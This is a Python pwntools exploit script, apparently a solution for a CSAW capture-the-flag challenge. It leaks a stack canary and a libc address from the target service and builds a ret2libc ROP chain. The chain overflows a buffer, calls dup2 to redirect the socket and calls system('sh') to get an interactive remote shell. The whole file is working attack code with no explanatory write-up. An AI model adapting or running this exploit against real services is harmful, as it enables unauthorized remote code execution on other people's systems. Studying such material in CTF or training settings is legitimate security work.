#!/usr/bin/env python

from pwn import *
from sys import argv

#local = False
local = True

def p(string): print text.green_on_black("[*] " + string)

def leak_canary():
  x.send("2\n\n")
  x.recvline()
  x.recvline()
  return u64(x.recvline()[311:319])

def leak_puts_address():
  x.send("1\n")
  x.recvuntil("Reference:")
  puts_addr = int(x.recvline().rstrip(), 16) + 0x500
  x.recvuntil('>')
  return puts_addr

def send_exploit(canary, system, shell, dup2, descriptor):
  pop_rdi_ret_address = 0x4012e3
  pop_rsi_pop_r15_ret_address = 0x4012e1

  x.sendline("2")
  x.recvuntil('>')

  payload  = "A" * 312
  payload += p64(canary)
  payload += "Aa0Aa1Aa"

  """
  dup2(rdi = 5, rsi = 0)
  dup2(rdi = 5, rsi = 1)
  """
  payload += p64(pop_rdi_ret_address)
  payload += p64(descriptor)

  payload += p64(pop_rsi_pop_r15_ret_address)
  payload += p64(0)
  payload += p64(0xdeadbeef)
  payload += p64(dup2)

  payload += p64(pop_rsi_pop_r15_ret_address)
  payload += p64(1)
  payload += p64(0xdeadbeef)
  payload += p64(dup2)

  payload += p64(pop_rdi_ret_address)
  payload += p64(shell)

  payload += p64(system)

  x.sendline(payload)

if __name__ == "__main__":

  if local:
    x = remote('127.0.0.1', argv[1])
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')
    descriptor = 4
  else:
    x = remote('pwn.chal.csaw.io', '8002')
    libc = ELF('./libc-2.19.so')
    descriptor = 4

  x.recvuntil(">")

  canary_leak = leak_canary()
  p(hex(canary_leak) + " <- leaked canary")

  puts_leak = leak_puts_address()
  p(hex(puts_leak) + " <- leaked puts() address")

  libc.address = puts_leak - libc.symbols['puts']
  p(hex(libc.address) + " <- libc base address")

  system_address = libc.symbols['system']
  p(hex(system_address) + " <- computed system() address")

  dup2_address = libc.symbols['dup2']
  p(hex(dup2_address) + " <- computed dup2() address")

  shell_address = next(libc.search('sh\x00'))
  p(hex(shell_address) + " <- computed 'sh\\x00' address")

  send_exploit(canary_leak, system_address, shell_address, dup2_address, descriptor)

  x.interactive()
